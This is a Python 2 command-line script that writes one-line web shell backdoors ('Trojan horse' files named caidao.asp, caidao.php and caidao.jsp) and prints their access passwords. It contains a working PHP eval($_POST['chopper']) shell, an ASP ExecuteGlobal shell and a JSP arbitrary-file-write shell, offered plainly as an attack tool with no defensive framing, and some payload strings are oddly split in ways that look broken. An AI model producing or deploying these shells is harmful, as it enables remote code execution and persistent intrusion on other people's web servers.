import time
import os
from threading import Thread
import optparse
def aspyijuhua():
    try:
      juy=open('caidao.asp','w')
      asp="<%IfRequest(",'1',")<>""ThenExecuteGlobal(Request(",'1',"))%>"
      print '[+]Accelerated generation !'
      juy.writelines(asp)
      print '[+]ASP in word ,the Trojan horse is finished .'
      print '[+]Password:1'
    except:
        print '[-]Not generate !'

def phpyijuhua():
    try:
        php=open('caidao.php','w')
        payload="<?php @eval($_POST['chopper']);?>"
        print '[+]Accelerated generation !'
        php.writelines(payload)
        print '[+]PHP in word ,the Trojan horse is finished .'
        print '[+]Password:chopper'
    except:
        print '[-]Not generate !'

def jspyijuhua():
    try:
        jsp=open('caidao.jsp','w')
        payload="<%if(request.getParameter(",'f',")!=null)(newjava.io.FileOutputStream (application.getRealPath(",'\\',")+request.getParameter(",'f',"))).write (request.getParameter(",'t',").getBytes());%> "
        print '[+]Accelerated generation !'
        jsp.writelines(payload)
        print '[+]JSP in word ,the Trojan horse is finished .'
    except:
        print '[-]Not generate !'
def editon():
    print '-a ASP in word ,the Trojan horse is finished .'
    print '-p PHP in word ,the Trojan horse is finished .'
    print '-j JSP in word ,the Trojan horse is finished .'
    print 'Editon v.1.0'
    print 'What is your Haq me, Whatever you do love you'

def main():
  parser=optparse.OptionParser()
  parser.add_option('-a',action='store_true',dest='asp',help='ASP in word ,the Trojan horse is finished .')
  parser.add_option('-p',action='store_true',dest='php',help='PHP in word ,the Trojan horse is finished .')
  parser.add_option('-j',action='store_true',dest='jsp',help='JSP in word ,the Trojan horse is finished .')
  parser.add_option('-v',action='store_true',dest='help',help='Editon')
  (options,args)=parser.parse_args()
  if options.asp:
    a=Thread(target=aspyijuhua,args=())
    a.start()
  if options.php:
    px=Thread(target=phpyijuhua,args=())
    px.start()
  if options.jsp:
    j=Thread(target=jspyijuhua,args=())
    j.start()
  if options.help:
    h=Thread(target=editon(),args=())
    h.start()

if __name__ == '__main__':
    main()